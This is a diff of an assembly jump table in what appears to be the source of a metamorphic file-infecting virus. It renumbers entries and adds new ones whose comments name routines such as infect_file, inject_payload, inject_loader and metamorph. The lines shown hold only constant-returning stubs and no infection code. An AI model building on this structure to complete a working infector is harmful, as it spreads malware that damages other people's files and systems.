@@ -71,35 +71,46 @@ key_19: ; update_own_index
 	mov eax, 0x8b586bc8
 	jmp near end
 
+	;metamorph.c
+key_20: ; hash_fingerprint
+	mov eax, 0x8b586bc8
+	jmp near end
+key_21: ; metamorph
+	mov eax, 0x8b586bc8
+	jmp near end
+
 	;pestilence.c
-key_20: ; init_info
+key_22: ; init_info
 	mov eax, 0x8b586bc8
 	jmp near end
-key_21: ; inject_payload
+key_23: ; inject_payload
 	mov eax, 0x8b586bc8
 	jmp near end
-key_22: ; inject_loader
+key_24: ; inject_loader
 	mov eax, 0x8b586bc8
 	jmp near end
-key_23: ; inject_bis
+key_25: ; inject_bis
 	mov eax, 0x8b586bc8
 	jmp near end
-key_24: ; reload_mapping
+key_26: ; reload_mapping
 	mov eax, 0x8b586bc8
 	jmp near end
-key_25: ; inject_sign
+key_27: ; inject_sign
 	mov eax, 0x8b586bc8
 	jmp near end
-key_26: ; infect_file
+key_28: ; infect_file
 	mov eax, 0x8b586bc8
 	jmp near end
-key_27: ; get_index_file
+key_29: ; get_index_file
 	mov eax, 0x8b586bc8
 	jmp near end
-key_28: ; file_path
+key_30: ; file_path
 	mov eax, 0x8b586bc8
 	jmp near end
-key_29: ; close_entries
+key_31: ; close_entries
+	mov eax, 0x8b586bc8
+	jmp near end
+key_32: ; fill_tab_addr
 	mov eax, 0x8b586bc8
 	jmp near end
 
@@ -165,6 +176,12 @@ check_arg:
 	je key_28
 	cmp rdi, 29
 	je key_29
+	cmp rdi, 30
+	je key_30
+	cmp rdi, 31
+	je key_31
+	cmp rdi, 32
+	je key_32
 	mov rax, 0
 end:
 	ret
